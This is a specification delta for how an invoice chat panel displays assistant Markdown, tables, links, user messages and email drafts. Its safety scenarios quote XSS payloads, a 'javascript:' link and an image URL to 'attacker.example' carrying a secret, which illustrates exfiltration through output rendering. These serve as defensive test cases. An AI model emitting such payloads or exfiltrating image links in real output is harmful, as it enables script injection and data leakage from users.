# Spec Delta

## Purpose

Defines how messages in the invoice chat panel are displayed to the freelancer, so that assistant answers read as formatted text while every message type stays readable and safe.

## ADDED Requirements

### Requirement: Assistant messages render Markdown formatting
The chat panel SHALL show assistant message content as formatted Markdown, including GitHub-flavored tables. Markdown syntax characters used for formatting MUST NOT appear in the displayed text.

#### Scenario: Bold text
- **WHEN** an assistant message contains `Hi **some client**,`
- **THEN** "some client" is shown in bold and no `**` characters are visible

#### Scenario: Pipe table
- **WHEN** an assistant message contains a Markdown pipe table with a header row, a `|---|---|` separator row and data rows
- **THEN** the content is shown as a table with header cells and data cells, and no pipe or dash separator characters are visible

#### Scenario: Lists, headings, italic and inline code
- **WHEN** an assistant message contains a bulleted list, a numbered list, a `##` heading, `*italic*` text and `` `code` `` spans
- **THEN** each is shown with its formatting (list items, heading, italic, monospace) instead of raw syntax

#### Scenario: Paragraphs and line breaks preserved
- **WHEN** an assistant message contains paragraphs separated by blank lines, and a sign-off with single line breaks (for example "Best regards," then a name on the next line)
- **THEN** the paragraphs are shown as separate blocks and the single line breaks are kept

#### Scenario: Structured content parts
- **WHEN** an assistant message's content is a list of text parts
- **THEN** the parts are joined and the result is shown as Markdown

### Requirement: Wide tables stay inside the message bubble
A table in an assistant message SHALL NOT make the message bubble wider than its normal maximum width. Content that does not fit MUST be reachable by scrolling sideways inside the bubble.

#### Scenario: Table wider than the bubble
- **WHEN** an assistant message contains a table whose content is wider than the bubble
- **THEN** the bubble keeps its maximum width and the table scrolls sideways inside it

### Requirement: Rendered Markdown is safe
Markdown display SHALL NOT run or insert raw HTML or script from message content. Links MUST open in a new tab without giving the new page access to the app. Links with unsafe schemes MUST NOT be clickable. Images in model output MUST NOT be loaded.

#### Scenario: Raw HTML in a message
- **WHEN** an assistant message contains `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`
- **THEN** no script runs and no image element is created from that content

#### Scenario: Safe link
- **WHEN** an assistant message contains `[portal](https://example.com)`
- **THEN** a link to `https://example.com` is shown that opens in a new tab with `rel` containing `noopener` and `noreferrer`

#### Scenario: Unsafe link scheme
- **WHEN** an assistant message contains `[click](javascript:alert(1))`
- **THEN** no element with a `javascript:` href is shown

#### Scenario: Image in model output
- **WHEN** an assistant message contains `![chart](https://attacker.example/x.png?d=secret)`
- **THEN** no image request is made, the URL does not appear in the page, and only the alt text "chart" is shown

### Requirement: Non-assistant messages keep their current display
User messages, tool results and inbound client replies SHALL NOT be shown as Markdown. User messages and client replies MUST show their text as written, with line breaks kept. Tool results MUST stay in a monospace block.

#### Scenario: User message with Markdown characters
- **WHEN** the freelancer sends `use **bold** please`
- **THEN** the user bubble shows the literal text `use **bold** please`

#### Scenario: Tool result
- **WHEN** a tool result message contains `| a | b |`
- **THEN** it is shown as literal monospace text in the tool result block

#### Scenario: Inbound client reply
- **WHEN** an inbound client reply body contains `**urgent**`
- **THEN** the client reply card shows the literal text `**urgent**`

### Requirement: Draft approval stays plain text
The email draft review and edit area SHALL show and edit the draft as plain text, because what the freelancer approves is the exact email body that is sent.

#### Scenario: Draft containing Markdown characters
- **WHEN** a draft awaiting approval contains `**Chiranjeev Thomas**`
- **THEN** the draft view shows the literal characters, and the approved email body equals the text as shown
